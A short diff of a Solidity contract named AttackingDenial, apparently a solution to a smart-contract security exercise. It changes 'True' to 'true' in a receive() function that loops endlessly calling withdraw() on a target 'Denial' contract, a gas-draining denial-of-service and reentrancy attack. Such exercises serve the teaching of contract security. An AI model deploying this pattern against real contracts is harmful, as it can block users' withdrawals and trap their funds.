@@ -11,7 +11,7 @@ contract AttackingDenial {
 
     //Code me!
     receive() external payable{
-        while (True) {
+        while (true) {
             Denial(contractAddress).withdraw();
         }
     }
